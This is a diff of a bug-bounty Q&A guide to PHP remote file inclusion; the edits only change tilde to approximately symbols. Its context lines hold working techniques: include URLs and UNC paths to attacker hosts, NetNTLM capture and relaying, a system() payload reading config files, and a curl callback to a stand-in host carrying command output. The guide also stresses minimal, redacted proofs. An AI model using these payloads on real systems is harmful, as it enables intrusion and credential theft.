@@ -345,7 +345,7 @@ UNC include → coerced NTLM auth → `ntlmrelayx` to LDAP/SMB → command exec 
 Run a benign read of config/.env (`<?php system('head /var/www/config.php'); ?>` or via your command shell), **minimally** and **redacted**, to demonstrate credential exposure → pivot read-only. Don't exfiltrate large amounts of real data.
 
 ### Q70. What's the severity & CWE?
-RFI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-98** (Improper Control of Filename for Include) + **CWE-94** (Code Injection). UNC NTLM-capture without exec → High (CWE-918-style auth coercion).
+RFI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (≈9.8). **CWE-98** (Improper Control of Filename for Include) + **CWE-94** (Code Injection). UNC NTLM-capture without exec → High (CWE-918-style auth coercion).
 
 ### Q71. How do I handle "RFI but execution is constrained" (sandboxed include)?
 Read what you can (config/secrets), and if the constrained context still includes your file, demonstrate the highest available impact. If it's truly non-executing, it's not RCE — reassess (maybe stored XSS / info-leak, or SSRF if only fetched).
@@ -525,7 +525,7 @@ RFI is when an app passes attacker-controlled input into an **include/require** 
 Because **`allow_url_include` has been `Off` by default since PHP 5.2.0 (2006)**, was deprecated in 7.4, and **removed in PHP 8.0** — so `?page=http://evil/shell.txt` just fails on modern PHP. It didn't kill RFI, it *moved* it: you now win via **`data://`/`php://input`** (if the flag is on), **Windows UNC/SMB** (a filesystem path, not gated by the flag), a **legacy PHP 5.x app**, or by handing the sink to **LFI**. Know the PHP version and you know which primitive to try.
 
 ### Q105. Explain the TimThumb bug in one breath.
-`timthumb.php` (bundled in hundreds of WordPress themes) allowlisted image-source hosts but matched the trusted string **anywhere in the hostname**, so `http://blogger.com.attacker.com/shell.php` passed — it downloaded attacker PHP into a web-served cache dir → RCE, ~1.2 million sites (CVE-2011-4106, 2011). The lesson: a **substring check is not an allowlist**; anchor host validation to the *full* host.
+`timthumb.php` (bundled in hundreds of WordPress themes) allowlisted image-source hosts but matched the trusted string **anywhere in the hostname**, so `http://blogger.com.attacker.com/shell.php` passed — it downloaded attacker PHP into a web-served cache dir → RCE, ≈1.2 million sites (CVE-2011-4106, 2011). The lesson: a **substring check is not an allowlist**; anchor host validation to the *full* host.
 
 ### Q106. `allow_url_include` is `Off` and the box is Windows. Is RFI possible?
 Yes. A UNC path like `\\attacker\share\shell.php` is treated by PHP as an ordinary **file path**, so `include()` executes it **regardless of `allow_url_include`** — the flag only gates *URL wrappers*, not SMB filesystem paths. Bonus: the SMB handshake leaks a **NetNTLM** hash to your `Responder`, so even if execution is blocked you can crack or relay it. If 445 is filtered outbound, the same runs over **WebDAV on 80/443**.
@@ -573,7 +573,7 @@ On **Windows**: `?page=\\you\share\shell.php` executes over SMB (UNC is a local 
 No. RCE is already the maximum severity — reading real customer data adds legal risk and **no** bounty. For impact, read *your own* proof (`id`, `hostname`) and, if the program wants config-level proof, read the app's **own** config/`.env` **read-only and redacted** to show the blast radius (DB/cloud creds exist), never the users' data. Then validate any secret read-only, note it, and clean up. Restraint is part of a professional PoC (§19).
 
 ### Q119. Blind RFI: no output at all, but timing hints your code might run. Prove it?
-Two OOB techniques. **Time-based**: host `<?php sleep(10); ?>` and measure — a consistent ~10s delay vs a fast control proves execution. **Callback-with-output**: host `<?php system('curl http://you/exec_$(id|tr " " "_")'); ?>` (URL-encode) — a hit on your OOB carrying the `id` output proves *execution*, not just fetch. A bare OOB hit with no command output is still only SSRF-grade; make the callback carry command output.
+Two OOB techniques. **Time-based**: host `<?php sleep(10); ?>` and measure — a consistent ≈10s delay vs a fast control proves execution. **Callback-with-output**: host `<?php system('curl http://you/exec_$(id|tr " " "_")'); ?>` (URL-encode) — a hit on your OOB carrying the `id` output proves *execution*, not just fetch. A bare OOB hit with no command output is still only SSRF-grade; make the callback carry command output.
 
 ### Q120. Recon for RFI at scale — where do these hide in 2025?
 In **legacy surface**. Mine archived URLs (wayback/gau) for `?page=`/`?file=`/`?template=`/`?module=`/`?lang=` params; fingerprint **old CMS/plugins** (WordPress themes bundling TimThumb-era scripts, old PHP apps); check anything reporting **PHP 5.x** or a dev who left `allow_url_include=On`. RFI is rarer than LFI now, which means the ones you find are **less-duped Criticals** — pair this with the Recon kit's acquisition/legacy-asset hunting and test every confirmed LFI *include* sink as an RFI candidate too.
